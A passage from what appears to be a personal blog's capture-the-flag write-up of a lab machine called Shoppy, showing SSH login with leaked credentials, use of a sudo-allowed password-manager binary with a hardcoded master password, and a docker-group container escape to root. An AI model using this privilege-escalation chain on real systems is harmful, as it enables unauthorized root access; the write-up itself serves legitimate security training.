</span></span><span style="display:flex;"><span>Hey @jaeger, when I was trying to install docker on the machine, I started learn C++ and I do a password manager. You can test it if you want, the program is on the deploy machine.
</span></span></code></pre></div><p><img src="/Pasted-image-20221217011328.png" alt="Image alt"></p>
<ul>
<li>Leaked credentials:</li>
</ul>
<p><img src="/Pasted-image-20221217011845.png" alt="Image alt"></p>
<ul>
<li>Credentials:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># username=&#34;jaeger&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># password=&#34;Sh0ppyBest@pp!&#34;</span>
</span></span></code></pre></div><ul>
<li>Nothing but a cute cat :P</li>
</ul>
<p><img src="/Pasted-image-20221217012244.png" alt="Image alt"></p>
<h1 id="getting-foothold-user-flag-ssh-to-the-box-using-the-leaked-username-and-password">Getting foothold (User flag): SSH to the box using the leaked username and password</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>goku@exploitation:~$ ssh jaeger@10.10.11.180
</span></span><span style="display:flex;"><span>jaeger@10.10.11.180<span style="color:#ae81ff">\&#39;</span>s password:
</span></span><span style="display:flex;"><span>Linux shoppy 5.10.0-18-amd64 <span style="color:#75715e">#1 SMP Debian 5.10.140-1 (2022-09-02) x86_64</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>The programs included with the Debian GNU/Linux system are free software;
</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span><span style="display:flex;"><span>permitted by applicable law.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>jaeger@shoppy:~$ ls
</span></span><span style="display:flex;"><span>Desktop  Documents  Downloads  Music  Pictures  Public  ShoppyApp  shoppy_start.sh  Templates  user.txt  Videos
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>jaeger@shoppy:~$ ls -alh user.txt
</span></span><span style="display:flex;"><span>-rw-r----- <span style="color:#ae81ff">1</span> root jaeger <span style="color:#ae81ff">33</span> Dec <span style="color:#ae81ff">16</span> 16:25 user.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>jaeger@shoppy:~$
</span></span></code></pre></div><h1 id="pivotting-to-user-deploy">Pivotting to user <code>deploy</code>:</h1>
<ul>
<li>We can run the <code>/home/deploy/password-manager</code> as user <code>deploy</code></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jaeger@shoppy:~$ sudo -l
</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> jaeger on shoppy:
</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User jaeger may run the following commands on shoppy:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>deploy<span style="color:#f92672">)</span> /home/deploy/password-manager
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>jaeger@shoppy:~$ cd /home/deploy/
</span></span><span style="display:flex;"><span>jaeger@shoppy:/home/deploy$ ls
</span></span><span style="display:flex;"><span>creds.txt  password-manager  password-manager.cpp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>jaeger@shoppy:/home/deploy$ ls -alh
</span></span><span style="display:flex;"><span>total 52K
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> deploy deploy 4.0K Jul <span style="color:#ae81ff">23</span> 03:34 .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> root   root   4.0K Jul <span style="color:#ae81ff">22</span> 13:12 ..
</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#ae81ff">1</span> deploy deploy    <span style="color:#ae81ff">9</span> Jul <span style="color:#ae81ff">22</span> 13:14 .bash_history -&gt; /dev/null
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> deploy deploy  <span style="color:#ae81ff">220</span> Mar <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2022</span> .bash_logout
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> deploy deploy 3.5K Mar <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2022</span> .bashrc
</span></span><span style="display:flex;"><span>-rw------- <span style="color:#ae81ff">1</span> deploy deploy   <span style="color:#ae81ff">56</span> Jul <span style="color:#ae81ff">22</span> 13:15 creds.txt
</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#ae81ff">1</span> deploy deploy    <span style="color:#ae81ff">9</span> Jul <span style="color:#ae81ff">23</span> 03:34 .dbshell -&gt; /dev/null
</span></span><span style="display:flex;"><span>drwx------ <span style="color:#ae81ff">3</span> deploy deploy 4.0K Jul <span style="color:#ae81ff">23</span> 03:31 .gnupg
</span></span><span style="display:flex;"><span>-rwxr--r-- <span style="color:#ae81ff">1</span> deploy deploy  19K Jul <span style="color:#ae81ff">22</span> 13:20 password-manager
</span></span><span style="display:flex;"><span>-rw------- <span style="color:#ae81ff">1</span> deploy deploy  <span style="color:#ae81ff">739</span> Feb  <span style="color:#ae81ff">1</span>  <span style="color:#ae81ff">2022</span> password-manager.cpp
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> deploy deploy  <span style="color:#ae81ff">807</span> Mar <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2022</span> .profile
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>jaeger@shoppy:/home/deploy$
</span></span></code></pre></div><ul>
<li>We can&rsquo;t read the <code>creds.txt</code> file, we don&rsquo;t have the necessary permissions. But, the <code>password-manager</code> can.</li>
<li>Runing the <code>password-manager</code> binary.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jaeger@shoppy:/home/deploy$ sudo -u deploy /home/deploy/password-manager
</span></span><span style="display:flex;"><span>Welcome to Josh password manager!
</span></span><span style="display:flex;"><span>Please enter your master password:
</span></span></code></pre></div><ul>
<li>We need a master password. By reversing the <code>password-manager</code> we can get this key <code>master_password: Sample</code></li>
</ul>
<p><img src="/Pasted-image-20221217021742.png" alt="Image alt"></p>
<ul>
<li>After entering the right master password the <code>password-manager</code> will execute the cat command as deploy and we will be able to get the creds.txt content.</li>
</ul>
<p><img src="/Pasted-image-20221217021815.png" alt="Image alt"></p>
<ul>
<li>Credentiales:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jaeger@shoppy:/home/deploy$ sudo -u deploy /home/deploy/password-manager
</span></span><span style="display:flex;"><span>Welcome to Josh password manager!
</span></span><span style="display:flex;"><span>Please enter your master password: Sample
</span></span><span style="display:flex;"><span>Access granted! Here is creds !
</span></span><span style="display:flex;"><span>Deploy Creds :
</span></span><span style="display:flex;"><span>username: deploy
</span></span><span style="display:flex;"><span>password: Deploying@pp!
</span></span><span style="display:flex;"><span>jaeger@shoppy:/home/deploy$ exit
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>goku@exploitation:~$ ssh deploy@10.10.11.180
</span></span><span style="display:flex;"><span>deploy@10.10.11.180<span style="color:#ae81ff">\&#39;</span>s password:
</span></span><span style="display:flex;"><span>Linux shoppy 5.10.0-18-amd64 <span style="color:#75715e">#1 SMP Debian 5.10.140-1 (2022-09-02) x86_64</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>The programs included with the Debian GNU/Linux system are free software;
</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span><span style="display:flex;"><span>permitted by applicable law.
</span></span><span style="display:flex;"><span>Last login: Fri Dec <span style="color:#ae81ff">16</span> 19:23:22 <span style="color:#ae81ff">2022</span> from 10.10.14.2
</span></span><span style="display:flex;"><span>$ ls
</span></span><span style="display:flex;"><span>creds.txt  password-manager  password-manager.cpp
</span></span><span style="display:flex;"><span>$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>deploy<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>deploy<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>deploy<span style="color:#f92672">)</span>,998<span style="color:#f92672">(</span>docker<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ bash
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>deploy@shoppy:~$
</span></span></code></pre></div><ul>
<li>The <code>password-manager</code> source code:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">// password-manager.cpp
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Welcome to Josh password manager!&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Please enter your master password: &#34;</span>;
</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>string password;
</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>cin <span style="color:#f92672">&gt;&gt;</span> password;
</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>string master_password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>    master_password <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;S&#34;</span>;
</span></span><span style="display:flex;"><span>    master_password <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;a&#34;</span>;
</span></span><span style="display:flex;"><span>    master_password <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;m&#34;</span>;
</span></span><span style="display:flex;"><span>    master_password <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;p&#34;</span>;
</span></span><span style="display:flex;"><span>    master_password <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;l&#34;</span>;
</span></span><span style="display:flex;"><span>    master_password <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;e&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (password.compare(master_password) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Access granted! Here is creds !&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
</span></span><span style="display:flex;"><span>        system(<span style="color:#e6db74">&#34;cat /home/deploy/creds.txt&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Access denied! This incident will be reported !&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h1 id="road-to-root---privilege-escalation">Road to root - Privilege Escalation:</h1>
<ul>
<li>We are now <code>deploy</code> user. This user is running inside a docker instance.</li>
<li>Let&rsquo;s escape from the docker container.</li>
<li><code>deploy</code> user is a member of the <code>docker</code> group.</li>
<li>Using <a href="https://gtfobins.github.io/gtfobins/docker/">GTFOBins | Docker Escape</a>
<blockquote>
<p>This requires the user to be privileged enough to run docker, i.e. being in the <code>docker</code> group or being <code>root</code>. Any other Docker Linux image should work, e.g., <code>debian</code>.
Shell:
It can be used to break out from restricted environments by spawning an interactive system shell. The resulting is a root shell.
docker run -v /:/mnt &ndash;rm -it alpine chroot /mnt sh</p>
</blockquote>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>deploy@shoppy:~$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>deploy<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>deploy<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>deploy<span style="color:#f92672">)</span>,998<span style="color:#f92672">(</span>docker<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>deploy@shoppy:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># id</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>,1<span style="color:#f92672">(</span>daemon<span style="color:#f92672">)</span>,2<span style="color:#f92672">(</span>bin<span style="color:#f92672">)</span>,3<span style="color:#f92672">(</span>sys<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>,6<span style="color:#f92672">(</span>disk<span style="color:#f92672">)</span>,10<span style="color:#f92672">(</span>uucp<span style="color:#f92672">)</span>,11,20<span style="color:#f92672">(</span>dialout<span style="color:#f92672">)</span>,26<span style="color:#f92672">(</span>tape<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>sudo<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># bash</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>root@6325e9918c50:/# cd root
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>root@6325e9918c50:~# ls
</span></span><span style="display:flex;"><span>root.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>root@6325e9918c50:~# cat root.txt
</span></span></code></pre></div><h1 id="pwned-thanks-for-reading">Pwned, Thanks For Reading!</h1>

		</section>

		<div class="post-tags">
			
			
			
		</div>
	</article>
</main>
<footer>
  <div style="display:flex"><a class="soc" href="https://github.com/gokupwn" rel="me" title="GitHub"><i data-feather="github"></i></a>
    <a class="border"></a><a class="soc" href="https://twitter.com/gokupwn" rel="me" title="Twitter"><i data-feather="twitter"></i></a>
    <a class="border"></a><a class="soc" href="https://www.instagram.com/gokupwn/" rel="me" title="Instagram"><i data-feather="instagram"></i></a>
    <a class="border"></a></div>
  <div class="footer-info">
    2023  © gokupwn |  <a
      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
  </div>
</footer>


<script>
  feather.replace()
</script></div>
    </body>
</html>
